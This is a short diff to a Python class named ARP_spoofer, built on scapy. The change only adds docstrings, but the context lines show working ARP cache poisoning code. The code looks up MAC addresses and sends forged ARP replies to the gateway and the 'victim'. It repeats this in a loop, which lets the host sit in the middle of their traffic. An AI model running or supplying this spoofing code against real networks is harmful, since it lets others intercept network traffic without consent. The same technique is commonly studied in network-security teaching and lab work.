@@ -33,6 +33,7 @@ class ARP_spoofer:
         return
 
     def get_mac(self, ip_address):
+        """Sends an ARP request and waits for a reply to obtain the MAC of the given IP address"""
         mac_query = sc.ARP(op = 1, hwdst = "ff:ff:ff:ff:ff:ff", pdst = ip_address)
         mac_query_ans, _ = sc.sr(mac_query, timeout=5, verbose=False)
         for _, mac_query_response in mac_query_ans:
@@ -41,6 +42,7 @@ class ARP_spoofer:
         return None
 
     def arp_spoof(self, mac_gateway, mac_victim, ip_gateway, ip_victim, mac_host):
+        """Sends 2 spoofing ARP packets"""
         #trick gateway
         sc.send(sc.ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway, psrc=ip_victim, hwsrc=mac_host), verbose=False)
         # trick victim
@@ -63,6 +65,7 @@ class ARP_spoofer:
 
 
     def arp_spoof_loop(self):
+        """At each iteration obtains MAC addresses of targeted IPs and spoof their ARP tables"""
         while True:
             # wait between 2 spoofing packets
             time.sleep(2)
